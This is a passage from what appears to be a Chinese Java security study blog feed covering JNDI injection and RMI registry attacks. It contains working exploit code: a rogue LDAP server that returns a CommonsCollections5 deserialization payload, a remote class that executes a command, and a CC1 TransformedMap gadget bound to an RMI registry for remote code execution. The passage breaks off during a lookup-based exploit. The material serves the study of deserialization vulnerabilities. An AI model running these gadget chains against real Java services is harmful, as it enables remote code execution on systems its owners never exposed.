class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://192.168.43.88/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">6666</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CommonsCollections5());</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] CommonsCollections5() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JNDI_Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://127.0.0.1:7777/calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test.class放http服务下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240322214343240.png" alt="image-20240322214343240"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI</title>
      <link href="/2024/03/20/java/RMI/"/>
      <url>/2024/03/20/java/RMI/</url>
      
        <content type="html"><![CDATA[<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>RMI（Remote Method Invocation）是计算机之间通过网络实现对象调用的一种通讯机制。它允许在Java虚拟机（JVM）之间进行通信，使得在一个JVM中的对象可以调用另一个JVM中的对象的方法，就像这些对象都在同一个JVM中一样。</p><p><strong>服务端（Server）：</strong></p><ul><li>服务端创建一个远程对象，并实现一个或多个远程接口。</li><li>服务端启动 RMI 注册表，并将远程对象绑定到注册表中。</li></ul><p><strong>客户端（Client）：</strong></p><ul><li>客户端从 RMI 注册表中查找所需的远程对象。</li><li>客户端获取远程对象的引用，并调用其方法。</li></ul><p><strong>测试环境：JDK8u41</strong></p><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="comment">// 接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String para)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String para)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(para);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;over&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 实例化远程对象</span></span><br><span class="line">        <span class="type">RemoteObjImpl</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="comment">// 创建注册中心</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 绑定对象示例到注册中心</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Remote&quot;</span>, h);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Naming.rebind(静态方法) 和 registry.bind(实例方法) 都是将一个远程对象绑定到 RMI 注册表中,Naming.rebind()方法是JNDI的一部分</span></span><br><span class="line"><span class="comment">//        RemoteObjImpl h = new RemoteObjImpl();</span></span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.createRegistry(1099);</span></span><br><span class="line"><span class="comment">//        registry.bind(&quot;Remote&quot;, h);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RMIClient.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RMIServer.<span class="type">IRemoteObj</span> <span class="variable">h</span> <span class="operator">=</span> (RMIServer.IRemoteObj)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Remote&quot;</span>);</span><br><span class="line">        System.out.println(h.hello(<span class="string">&quot;hello world&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// java.rmi.registry.Registry</span></span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span></span><br><span class="line"><span class="comment">//        RMIServer.IRemoteObj remoteObj = (RMIServer.IRemoteObj) registry.lookup(&quot;Remote&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(remoteObj.hello(&quot;hello world&quot;));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h3><p>与注册中心进行交互方法：list、bind、rebind、unbind、lookup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Remote&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());</span><br></pre></td></tr></table></figure><p>这几种方法位于<code>RegistryImpl_Skel#dispatch</code>中，如果存在对传入的对象调用<code>readObject()</code>方法，则可以利用<code>dispatch</code>里面对应如下：</p><ul><li>0 —– bind</li><li>1 —– list</li><li>2 —– lookup</li><li>3 —– rebind</li><li>4 —– unbind</li></ul><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>只有<code>writeObject()</code>，没有<code>readObject()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegistryListAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] s = Naming.list(<span class="string">&quot;rmi://127.0.0.1:1099&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240319202514423.png" alt="image-20240319202514423"></p><h4 id="bind-或-rebind"><a href="#bind-或-rebind" class="headerlink" title="bind 或 rebind"></a>bind 或 rebind</h4><p>Server 端在执行 bind 或者 rebind 方法的时候会将对象以序列化的形式传输给 Registry，导致 Registry 反序列化被 RCE</p><p><strong>CC依赖</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CC1_TransformedMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackRegistryEXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1_TransformedMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);  // test</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;abc&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) CC1_TransformedMap();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240319204757003.png" alt="image-20240319204757003"></p><h4 id="lookup-或-unbind"><a href="#lookup-或-unbind" class="headerlink" title="lookup 或 unbind"></a>lookup 或 unbind</h4><p>lookup 方法接收一个 String 类型的参数，无法直接利用，需要手动模拟 RegistryImpl_Stub#lookup 方法传递过程</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240320191230107.png" alt="image-20240320191230107"></p><p>lookup 学习 lookupEXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 